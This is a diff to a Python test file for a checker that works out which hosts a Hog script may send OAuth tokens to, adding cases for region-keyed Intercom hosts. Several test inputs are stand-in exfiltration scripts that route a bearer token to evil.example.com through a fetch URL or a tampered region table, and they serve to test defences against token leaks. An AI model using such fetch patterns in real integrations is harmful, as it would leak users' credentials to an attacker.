@@ -57,6 +57,7 @@ REGION_FETCH = (
     "{'headers': {'Authorization': f'Bearer {inputs.oauth.access_token}'}})"
 )
 INTERCOM_REGIONS = f"{REGIONS_TABLE}\n{REGION_FETCH}"
+IN_EUROPE = {"app.region": "Europe"}
 SENDS_TO_TABLE_IN_EVENT = "fetch(event['event'], {'headers': {'Authorization': f'Bearer {inputs.oauth.access_token}'}})"
 SLACK_HOG = """
 let res := fetch('https://slack.com/api/chat.postMessage', {
@@ -748,8 +749,18 @@ class TestSecretHosts(SimpleTestCase):
                 "host_from_a_constant_table",
                 INTERCOM_REGIONS,
                 "oauth",
-                {},
-                _origins("https://api.intercom.io", "https://api.eu.intercom.io", "https://api.au.intercom.io"),
+                IN_EUROPE,
+                _origins("https://api.eu.intercom.io"),
+            ),
+            ("constant_table_key_unknown", INTERCOM_REGIONS, "oauth", {}, UNBOUND),
+            ("constant_table_key_missing_from_the_table", INTERCOM_REGIONS, "oauth", {"app.region": "Mars"}, UNBOUND),
+            (
+                "constant_table_key_from_the_event_with_the_host_after_it",
+                f"{REGIONS_TABLE}\nfetch(f'https://{{regions[event.properties.region]}}/evil.example.com', "
+                "{'headers': {'Authorization': inputs.oauth.access_token}})",
+                "oauth",
+                IN_EUROPE,
+                UNBOUND,
             ),
             (
                 "constant_table_declared_in_a_block",
@@ -762,10 +773,16 @@ class TestSecretHosts(SimpleTestCase):
                 "constant_table_declared_in_a_function_body",
                 f"fun setup() {{\n{REGIONS_TABLE}\n}}\n{REGION_FETCH}",
                 "oauth",
-                {},
+                IN_EUROPE,
                 UNBOUND,
             ),
-            ("constant_table_read_before_its_declaration", f"{REGION_FETCH}\n{REGIONS_TABLE}", "oauth", {}, UNBOUND),
+            (
+                "constant_table_read_before_its_declaration",
+                f"{REGION_FETCH}\n{REGIONS_TABLE}",
+                "oauth",
+                IN_EUROPE,
+                UNBOUND,
+            ),
             (
                 "constant_table_named_like_a_global",
                 "let event := {'event': 'https://slack.com/api/x'}\n" + SENDS_TO_TABLE_IN_EVENT,
@@ -777,14 +794,14 @@ class TestSecretHosts(SimpleTestCase):
                 "constant_table_declared_twice",
                 f"{REGIONS_TABLE}\nif (true) {{ let regions := {{'US': 'evil.example.com'}} }}\n{REGION_FETCH}",
                 "oauth",
-                {},
+                IN_EUROPE,
                 UNBOUND,
             ),
             (
                 "constant_table_changed",
                 "regions['US'] := 'evil.example.com'\n" + INTERCOM_REGIONS,
                 "oauth",
-                {},
+                IN_EUROPE,
                 UNBOUND,
             ),
             (
@@ -805,7 +822,7 @@ class TestSecretHosts(SimpleTestCase):
                 "constant_table_aliased",
                 INTERCOM_REGIONS + "let other := regions\nother['US'] := 'evil.example.com'",
                 "oauth",
-                {},
+                IN_EUROPE,
                 UNBOUND,
             ),
         ]
